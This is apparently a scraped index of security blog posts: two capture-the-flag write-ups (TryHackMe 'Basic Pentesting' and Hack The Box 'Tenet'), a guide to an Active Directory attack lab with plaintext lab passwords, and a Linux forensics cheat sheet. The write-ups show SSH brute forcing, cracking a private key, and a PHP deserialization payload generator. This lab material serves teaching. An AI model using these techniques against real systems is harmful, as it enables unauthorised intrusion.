[{"content":" Room Information   Name: Basic Pentesting Category: Boot2root Type: Challenge/CTF Difficulty: Easy Tools:  Nmap Gobuster John the Ripper smbclient   Skills Learned  Basics of enumeration Password cracking     Write-up Nmap nmap full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 \u0026amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).\n Enumeration - SMB (TCP 445) Anonymous login is allowed in SMB.\n Accessing anonymous share with anonymous logon finds a text file called staff.txt. I\u0026rsquo;ll grab that file to my machine\n The contents of staff.txt reveals two potential usernames: jan and kay.\n Enumeration - Web (TCP 80) Poking the web with curl finds out that it is under maintenance.\n Gobuster Gobuster scan discovers one hidden directory called development.\n→ root@kali «basic-pentesting» «10.9.30.115» $ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.67.164/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/05/29 13:43:47 Starting gobuster in directory enumeration mode =============================================================== /development (Status: 301) [Size: 318] [--\u0026gt; http://10.10.67.164/development/] /development The web has enabled directory listing on /development, and there are two text files in this directory: dev.txt and j.txt\n j.txt contains a note from K to J.\n From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.\ndev.txt contains about project development logs.\n Searchsploit There are some potential exploits for Apache Structs 2.5.12, which I could try later.\n Foothold For foothold, I have two options: brute force and exploiting Apache Struts.\nBrute force might take some time, so I\u0026rsquo;ll leave it on the background and start with Apache Struts.\nApache Struts RCE CVE-2017-9805 Metasploit also has an exploit module for this, so I\u0026rsquo;ll change fire up metasploit. But, I need to find out the struts URI.\nLooking back to the dev.txt file, it seems Kay uses this showchase.\n I also came across this blog post and found this:\n I checked the URL, and it\u0026rsquo;s there\n It tried it with metasploit and it worked!\n SSH - Jan via Brute Force It turns out Hydra finds Jan\u0026rsquo;s password for SSH in less than 2 minutes. The password is armando.\n→ root@kali «basic-pentesting» «10.9.30.115» $ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. ...\u0026lt;SNIP\u0026gt;... [22][ssh] host: 10.10.245.112 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found ...\u0026lt;SNIP\u0026gt;... Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-29 14:20:56 Now I can login as Jan with SSH client.\n→ root@kali «basic-pentesting» «10.9.30.115» $ ssh jan@10.10.245.112 jan@10.10.245.112\u0026#39;s password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$ id uid=1001(jan) gid=1001(jan) groups=1001(jan) Privilege Escalation Internal Enumeration Enumerating Kay\u0026rsquo;s home directory finds a readable SSH key\njan@basic2:/home/kay/.ssh$ ls -la total 20 drwxr-xr-x 2 kay kay 4096 Apr 23 2018 . drwxr-xr-x 5 kay kay 4096 Apr 23 2018 .. -rw-rw-r-- 1 kay kay 771 Apr 23 2018 authorized_keys -rw-r--r-- 1 kay kay 3326 Apr 19 2018 id_rsa -rw-r--r-- 1 kay kay 771 Apr 19 2018 id_rsa.pub I tried the key to SSH login locally as user Kay but it asked for a password, so I\u0026rsquo;ll just grab the private key for cracking.\njan@basic2:/home/kay/.ssh$ cat id_rsa -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75 IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX ...\u0026lt;SNIP\u0026gt;... 4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC 3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY -----END RSA PRIVATE KEY----- Cracking id_rsa I\u0026rsquo;ll convert Kay\u0026rsquo;s id_rsa to hash using ssh2john.py.\n→ root@kali «basic-pentesting» «10.9.30.115» $ /usr/share/john/ssh2john.py kay_rsa \u0026gt; kay_rsa.hash; cat kay_rsa.hash kay_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712e...\u0026lt;SNIP\u0026gt;... JtR finds the password: beeswax.\n SSH - Kay Interestingly, Kay\u0026rsquo;s is in the sudo group.\n→ root@kali «basic-pentesting» «10.9.30.115» $ chmod 600 kay_rsa \u0026amp;\u0026amp; ssh -i kay_rsa kay@10.10.245.112 Enter passphrase for key \u0026#39;kay_rsa\u0026#39;: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102 kay@basic2:~$ id uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) From here, I only need Kay\u0026rsquo;s password.\nSU - root In Kay\u0026rsquo;s home directory,t here is a file called pass.bak. It contains this string:\nkay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ I tried the string as Kay\u0026rsquo;s password for performing sudo su - and it worked.\nkay@basic2:~$ sudo su - root@basic2:~# id uid=0(root) gid=0(root) groups=0(root) root@basic2:~# ls -l total 4 -rw-r--r-- 1 root root 1017 Apr 23 2018 flag.txt The flag:\nCongratulations! You\u0026#39;ve completed this challenge. There are two ways (that I\u0026#39;m aware of) to gain a shell, and two ways to privesc. I encourage you to find them all! If you\u0026#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few takeaways from this challenge should be that every little bit of information you can find can be valuable, but sometimes you\u0026#39;ll need to find several different pieces of information and combine them to make them useful. Enumeration is key! Also, sometimes it\u0026#39;s not as easy as just finding an obviously outdated, vulnerable service right away with a port scan (unlike the first entry in this series). Usually you\u0026#39;ll have to dig deeper to find things that aren\u0026#39;t as obvious, and therefore might\u0026#39;ve been overlooked by administrators. Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you\u0026#39;ll send me a link! I can be reached at josiah@vt.edu. If you\u0026#39;ve got questions or feedback, please reach out to me. Happy hacking!  References  https://samsclass.info/124/proj14/p10xstruts.htm https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/  ","permalink":"https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/","summary":"Room Information   Name: Basic Pentesting Category: Boot2root Type: Challenge/CTF Difficulty: Easy Tools:  Nmap Gobuster John the Ripper smbclient   Skills Learned  Basics of enumeration Password cracking     Write-up Nmap nmap full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 \u0026amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).\n Enumeration - SMB (TCP 445) Anonymous login is allowed in SMB.","tags":["TryHackMe","Linux","Samba","CVE-2017-9805"],"title":"TryHackMe - Basic Pentesting"},{"content":"This is my personal documentation on setting up a pentesting lab in a virtual environment to learn some AD attack scenarios, network pivoting, and C2 (command \u0026amp; control) with metasploit.\nPrerequisites Knowledge  Virtualization and VirtualBox Windows OS and Server Installation Basics knowledge of Windows/Windows Server (Desktop/GUI version)/ Basics knowledge of Active Directory:  AD Domain Principle name DNS   Basics knowledge of Networking (routing).  Hardware The following are the main specifications that I recommend, the list is sorted by priority.\n Storage: 256 GB minimum, SSD is a must for server, or use high speed USB 3.1/ type C drive. RAM: 8 GB of minimum, 16 GB recommended dual channel. CPU: AMD Ryzen 3 or Intel i3 6th (minimum), AMD Ryzen 5+ with H prefix or i5+ 6th gen with K/H prefix. (recommended).  4th gen of i7 is still worth though.    For me, I used a single MSI laptop with the minimum requirements except for the CPU.\nSoftware  VirtualBox (Download) Kali Linux image file (Download) Windows 10 evaluation image file (Download) Windows Server 2019 evaluation image file (Download)  Topology I know it\u0026rsquo;s bad.\n So, for pivoting, I removed the Windows 10 inside network range of 10.10.10.100/28 from AD Domain.\nSetup VM System Configuration System Initial for installation\n Server: 2424 MB of RAM Client: x2 1280 MB of RAM  After installation (removed style/desktop/disable junk service)\n Server: 1280 MB of RAM Client: 1024 MB of RAM Attacking machine: 1024MB of RAM  Trust me, I use 8 GB to host these VM. 😂\n Windows 2019 = Server Windows 10 = Client Kali Linux/Armed Ubuntu = Attacker  For initial setup, the two clients can stay inside 192.168.1.0/24 network.\nNetwork Server Adapter 1:\n Setting up Server Initial setup  Admin credentials: administrator:p@$$w0rd! PC Name: server19-DC (restart after) Network (Static):  Adapter 1: 192.168.1.100/24 Adapter 2: 10.10.10.100/28    Promote to Domain Controller  Server Manager \u0026gt; Manage \u0026gt; Add Roles and Features. Add Roles and Features Wizard:  Installation type: \u0026ldquo;Role-based or feature-based installation\u0026rdquo; Server selection: server19-DC Server roles: \u0026ldquo;Active Directory Domain Services\u0026rdquo; and check the \u0026ldquo;Include management tools\u0026rdquo;. Features: Check the \u0026ldquo;Group Policy Management\u0026rdquo; Confirmation: Check on \u0026ldquo;Restart destination server automatically if required\u0026rdquo; Close after it\u0026rsquo;s done.   Server Manager \u0026gt; Notification flag \u0026gt; Click on \u0026ldquo;Promote this server to a domain controller\u0026rdquo; Active Directory Domain Services Configuration Wizard:  Deployment configuration: \u0026ldquo;Add a new forest\u0026rdquo; and set \u0026ldquo;server19.local\u0026rdquo; as root domain name Domain controller options: set \u0026ldquo;Windows Server 2016\u0026rdquo; as FFL (Forest Functional Level) and DFL (Domain Functional Level). Checklist DNS server and set the same admin password for DSRM password. Additional options: set NetBIOS domain name to SERVER19 Let the rest options in default state until installation section. Restart after installation complete.     Domain Accounts  John Smith  User logon name: jsmith@server19.local Password: jsmith@123   Carl Smith  User logon name: cmisth@server19.local Password: @csmith@    All password is set to never expires.\nService Account Fake SQL Service\n User logon name: SQLService@server19.local Password: Mysql@Password123  Set service principle name:\nsetspn -a SERVER19-DC/SQLService.SERVER19.local:60111 SERVER19\\SQLService setspn -T SERVER19.local -Q */* Configure File Sharing (SMB):  Server manager \u0026gt; File and Storage Services \u0026gt; Shares \u0026gt; Task \u0026gt; New Share. New Share Wizard:  Profile: SMB Share Quick Share Location: C:\\Shares\\DATA (Create the Shares folder in C:) Other Settings: Allow caching of share Permission: Leave it default Confirmation and create.    Setting up Client Initial setup  Client 1:  IP: 192.168.1.101 (static) PC name: NESCOFFEE   Client 2:  IP: 192.168.1.102 (static) PC name: MILO    Local Accounts Same with domain accounts, but add an L at the end of username/password.\n Username: cmisthL, password: jsmithL@123 Username: jsmithL, password: @csmith@  Join Domain Client 1:\n Use Server\u0026rsquo;s IP as DNS server: 192.168.1.100 Win+I, type \u0026ldquo;access\u0026rdquo;, click on Connect. Microsoft account window:  Click on \u0026ldquo;Join this device to a local Active Directory domain\u0026rdquo; under the alternate actions. Use the server administrator password to join. Skip the Add an account section Restart    Client 2 has the same steps.\nLocal Admin:  Set John Smith (jsmith@server19.local) as local administrator for NESCOFFEE. Set Carl Smith (cmisth@server19.local) as local administrator for MILO.  Setting up Attacking Machine  Put it on the same network Set static IP: 192.168.1.10  AD Attack Scenarios Here are some attack scenarios:\n LLMNR Poisoning - https://www.aptive.co.uk/blog/llmnr-nbt-ns-spoofing/ AS-REP Roasting  Example attacks: ASREP-Roasting tags   Kerberoasting - https://pentestlab.blog/2018/06/12/kerberoast/ Take Over IPv6 DNS - https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ DCSync  Example attacks: DCSync tags    Attack scenario(s) that requires two clients online:\n SMB Relay - https://akimboviper.gitbook.io/pentest-everything/everything/everything-windows/attacking-windows/relay-attacks/smb-relay  Example attacks: HackTheBox - APT    ","permalink":"https://fahmifj.github.io/blog/building-virtual-home-lab-for-pentesting/","summary":"This is my personal documentation on setting up a pentesting lab in a virtual environment to learn some AD attack scenarios, network pivoting, and C2 (command \u0026amp; control) with metasploit.\nPrerequisites Knowledge  Virtualization and VirtualBox Windows OS and Server Installation Basics knowledge of Windows/Windows Server (Desktop/GUI version)/ Basics knowledge of Active Directory:  AD Domain Principle name DNS   Basics knowledge of Networking (routing).  Hardware The following are the main specifications that I recommend, the list is sorted by priority.","tags":["nanoblog","Home-lab","Active-Directory"],"title":"Building Virtual Home Lab for Pentesting"},{"content":"My short cheat sheet for forensics and incident response on Linux systems. This will be updated over time.\nUsers-related Last login\n$ lastlog $ last Users with login shells\n$ cat /etc/passwd | grep sh$ List users' cron\n$ for user in $(cat /etc/passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done # users with shells only $ for user in $(cat /etc/passwd | grep sh$ | cut -f1 -d: ); do echo $user; crontab -u $user -l; done SSH authorized keys\n$ find / -type f -name authorized_keys Processes, Networks and Services Show process tree with username TTY, and wide output.\n$ ps auxfww Process details\n$ lsof -p [pid] Show all connections don\u0026rsquo;t resolve names (IP only)\n$ lsof -i -n $ netstat -anp # Look for tcp only $ netstat -antp $ ss -antp List all services\n$ service --status-all List firewall rules\n$ iptables --list-rules List all timers\n$ systemctl list-timers --all DNS related\n/etc/hosts /etc/resolv.conf Files and Folders Show list files and folder with nano timestamp, sort by modification time (newest).\n$ ls --full-time -lt List all files that were modified on a specific date/time.\n# List files which were modified on 2021-06-16 (YYYY-MM-DD) $ find / -newermt \u0026#34;2021-06-16\u0026#34; -ls 2\u0026gt;/dev/null # List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago) $ find / -newermt \u0026#34;2021-05-01\u0026#34; ! -newermt \u0026#34;2021-05-10\u0026#34; -ls 2\u0026gt;/dev/null # List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago) + add filter $ find / -newermt \u0026#34;2021-05-01\u0026#34; ! -newermt \u0026#34;2021-05-10\u0026#34; -ls 2\u0026gt;/dev/null | grep -v \u0026#39;filterone\\|filtertwo\u0026#39; # List files modified between 01:00 and 07:00 on June 16 2021. $ find / -newermt \u0026#34;2021-06-16 01:00:00\u0026#34; ! -newermt \u0026#34;2021-06-16 07:00:00\u0026#34; -ls 2\u0026gt;/dev/null # List files that were accessed exactly 2 days ago. $ find / -atime 2 -ls 2\u0026gt;/dev/null # List files that were modified in the last 2 days. $ find / -mtime -2 -ls 2\u0026gt;/dev/null File inspection\n$ stat [file] $ exiftool [file] Observe changes in files\n$ find . -type f -exec md5sum {} \\; | awk \u0026#39;{print $1}\u0026#39; | sort | uniq -c | grep \u0026#39; 1 \u0026#39; | awk \u0026#39;{print $2\t}\u0026#39; Look for cap_setuid+ep in binary capabilities\n$ getcap -r /usr/bin/ $ getcap -r /bin/ $ getcap -r / 2\u0026gt;/dev/null SUID\n$ find / -type f -perm -u=s 2\u0026gt;/dev/null Log auditing\n$ aureport --tty Persistence areas Directories:\n/etc/cron*/ /etc/incron.d/* /etc/init.d/* /etc/rc*.d/* /etc/systemd/system/* /etc/update.d/* /var/spool/cron/* /var/spool/incron/* /var/run/motd.d/* Files:\n/etc/passwd /etc/sudoers /home/\u0026lt;user\u0026gt;/.ssh/authorized_keys /home/\u0026lt;user\u0026gt;/.bashrc References  https://stackoverflow.com/questions/18339307/find-files-in-created-between-a-date-range https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users https://unix.stackexchange.com/questions/169798/what-does-newermt-mean-in-find-command https://ippsec.rocks/ https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#incron  ","permalink":"https://fahmifj.github.io/blog/linux-forensics-command-cheat-sheet/","summary":"My short cheat sheet for forensics and incident response on Linux systems. This will be updated over time.\nUsers-related Last login\n$ lastlog $ last Users with login shells\n$ cat /etc/passwd | grep sh$ List users' cron\n$ for user in $(cat /etc/passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done # users with shells only $ for user in $(cat /etc/passwd | grep sh$ | cut -f1 -d: ); do echo $user; crontab -u $user -l; done SSH authorized keys","tags":["nanoblog","Linux","Forensics","Cheatsheet"],"title":"Linux Forensics Command Cheat Sheet"},{"content":"Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.\nSkills Learned  PHP deserialization attack Race-condition  Tools  Nmap Gobuster PHP  Reconnaissance Nmap Full scan on Tenet discovers only two open ports: SSH on port 22 and an Apache web server on port 80.\n→ root@kali «tenet» «10.10.14.31» $ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.223 | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) → root@kali «tenet» «192.168.43.234» $ nmap -sC -sV -p$ports -oA scans/full-tenet 10.10.10.223 # Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223 Nmap scan report for 10.10.10.223 Host is up (0.059s latency). Scanned at 2021-03-16 23:32:46 EDT for 17s PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo= | 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds Enumeration TCP 80 - Website nmap already identified that this site shows the default page of Apache web server.\n Gobuster Running gobuster against the site reveals that there is a WordPress site.\n→ root@kali «tenet» «10.10.14.31» $ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.223/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,php,bak [+] Timeout: 10s =============================================================== 2021/06/14 06:08:53 Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 10918] /users.txt (Status: 200) [Size: 7] /wordpress (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.223/wordpress/] =============================================================== 2021/06/14 06:11:20 Finished =============================================================== Poking /users.txt returns a text \u0026ldquo;Success\u0026rdquo;, I don\u0026rsquo;t know what\u0026rsquo;s that means.\n /wordpress Somehow on /wordpress, the site looks broken.\n It turns out there is a hostname.\n I\u0026rsquo;ll add tenet.htb to my /etc/hosts\n→ root@kali «tenet» «10.10.14.31» $ echo \u0026#39;tenet.htb 10.10.10.223\u0026#39; \u0026gt;\u0026gt; /etc/hosts Poking curl shows that this port has different contents when we visit it with a hostname.\n→ root@kali «tenet» «10.10.14.31» $ curl -s http://10.10.10.223 | wc -c 10918 → root@kali «tenet» «10.10.14.31» $ curl -s http://tenet.htb | wc -c 10581 From here, I\u0026rsquo;ll separate the enumeration on new section.\nTCP 80 - tenet.htb Probably http://10.10.10.223/wordpress/ is redirected to tenet.htb by the web server.\n There is one post titled with \u0026ldquo;Migrations\u0026rdquo; states that they\u0026rsquo;re currently migrating the data from a flat file.\n  /etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.\n At the bottom, there is one user commented on the migration post which is probably the hint.\n I\u0026rsquo;ll note that \u0026ldquo;sator php\u0026rdquo; file and also a backup of that file.\nWPScan I ran a wpscan to find some database backup or something related with that, but I didn\u0026rsquo;t find anything except usernames.\n→ root@kali «tenet» «10.10.14.31» $ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15 _______________________________________________________________ __ _______ _____ \\ \\  / / __ \\ / ____| \\ \\  /\\  / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\  \\  /\\  / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ ...\u0026lt;SNIP\u0026gt;... [i] User(s) Identified: [+] protagonist | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] neil | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Directory brute-force (Guessing) I tried to guess the location of sator php files with curl but it returned with 404.\n→ root@kali «tenet» «10.10.14.31» $ for i in sator.php sator.php.bak; do curl -sIL http://tenet.htb/$i; done HTTP/1.1 404 Not Found Date: Mon, 14 Jun 2021 10:51:50 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1 HTTP/1.1 404 Not Found Date: Mon, 14 Jun 2021 10:51:51 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1 Vhost enumeration Next, I\u0026rsquo;ll try to enumerate vhost, but first I\u0026rsquo;ll use cewl to generate a custom wordlist. Because \u0026ldquo;sator\u0026rdquo; and \u0026ldquo;backup\u0026rdquo; are consists of 5 characters, I\u0026rsquo;ll set the minimum word length to 5.\n→ root@kali «tenet» «10.10.14.31» $ cewl -m 5 -w wordlist-vhost http://tenet.htb CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) I\u0026rsquo;ll use that wordlist with ffuf.\n→ root@kali «tenet» «10.10.14.31» $ ffuf -w wordlist-vhost -u http://10.10.10.223 -H \u0026#34;Host: FUZZ.tenet.htb\u0026#34; -mc 200 /\u0026#39;___\\ /\u0026#39;___\\  /\u0026#39;___\\  /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\  \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\  \\ \\_\\  \\ \\____/ \\ \\_\\  \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.223 :: Wordlist : FUZZ: wordlist-vhost :: Header : Host: FUZZ.tenet.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ fields [Status: 200, Size: 10918, Words: 3499, Lines: 376] branding [Status: 200, Size: 10918, Words: 3499, Lines: 376] migration [Status: 200, Size: 10918, Words: 3499, Lines: 376] Oops, it was a mess.\nI\u0026rsquo;ll filter out Lines 376 by adding -fl 376.\n→ root@kali «tenet» «10.10.14.31» $ ffuf -w wordlist-vhost -u http://10.10.10.223 -H \u0026#34;Host: FUZZ.tenet.htb\u0026#34; -mc 200 -fl 376 /\u0026#39;___\\ /\u0026#39;___\\  /\u0026#39;___\\  /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\  \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\  \\ \\_\\  \\ \\____/ \\ \\_\\  \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.223 :: Wordlist : FUZZ: wordlist-vhost :: Header : Host: FUZZ.tenet.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 :: Filter : Response lines: 376 ________________________________________________ :: Progress: [93/93] :: Job [1/1] :: 11 req/sec :: Duration: [0:00:05] :: Errors: 0 :: But didn\u0026rsquo;t find any (damn this tool is insanely fast, took 5 sec).\nApache Default Page (Revisit) Another guessing, I think the keyword is \u0026ldquo;Migration\u0026rdquo;, so probably before moving into /wordpress/, the site was previously hosted at / (the root).\nI found the files that user Neil was talking about at http://10.10.10.223/[here], without the hostname:\n→ root@kali «tenet» «10.10.14.31» $ for i in sator.php sator.php.bak; do curl -sIL http://10.10.10.223/$i; done HTTP/1.1 200 OK Date: Mon, 14 Jun 2021 11:21:04 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=UTF-8 HTTP/1.1 200 OK Date: Mon, 14 Jun 2021 11:21:05 GMT Server: Apache/2.4.29 (Ubuntu) Last-Modified: Thu, 17 Dec 2020 09:52:50 GMT ETag: \u0026#34;202-5b6a5f47911e4\u0026#34; Accept-Ranges: bytes Content-Length: 514 Content-Type: application/x-trash Sator.php:\n→ root@kali «tenet» «10.10.14.31» $ curl -s http://10.10.10.223/sator.php [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt; sator.php.bak:\n→ root@kali «tenet» «10.10.14.31» $ curl -s http://10.10.10.223/sator.php.bak \u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;users.txt\u0026#39;; public $data = \u0026#39;\u0026#39;; public function update_db() { echo \u0026#39;[+] Grabbing users from text file \u0026lt;br\u0026gt;\u0026#39;; $this-\u0026gt; data = \u0026#39;Success\u0026#39;; } public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this -\u0026gt;user_file, $this-\u0026gt;data); echo \u0026#39;[] Database updated \u0026lt;br\u0026gt;\u0026#39;; // echo \u0026#39;Gotta get this working properly...\u0026#39;; } } $input = $_GET[\u0026#39;arepo\u0026#39;] ?? \u0026#39;\u0026#39;; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); ?\u0026gt; Foothold Shell as www-data Object Injection/Deserialization attack From the previous code, sator.php.bak contains a PHP magic function called __destruct(). I\u0026rsquo;m not skilled enough to explain it on detail, but that function will be called when there is no more references to an object:\n$app = new DatabaseExport; $app -\u0026gt; update_db(); // __destruct is called afterwards // [] Database updated will be printed out Examples:\n There is no input validation/sanitization on the $input variable, I could send a serialized object of DatabaseExport which contains malicious things by assuming that sator.php uses the same code as sator.php.bak.\nAlso since unserialize is called before the creation of object ($app), I\u0026rsquo;ll use the opposite magic function called __construct().\n$input = $_GET['arepo'] ?? ''; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); Testing Payload First, I\u0026rsquo;ll just do some testing with this script below and save it to a file called tenetization.php:\n\u0026lt;?php class DatabaseExport { public function __construct() { $this-\u0026gt;user_file = \u0026#39;test.php\u0026#39;; $this-\u0026gt;data = \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34;; } } $o = new DatabaseExport(); echo urlencode(serialize($o)); ?\u0026gt;I use URL encode there because I\u0026rsquo;m going to use curl to interact with the site.\nI\u0026rsquo;ll run that script.\n→ root@kali «exploits» 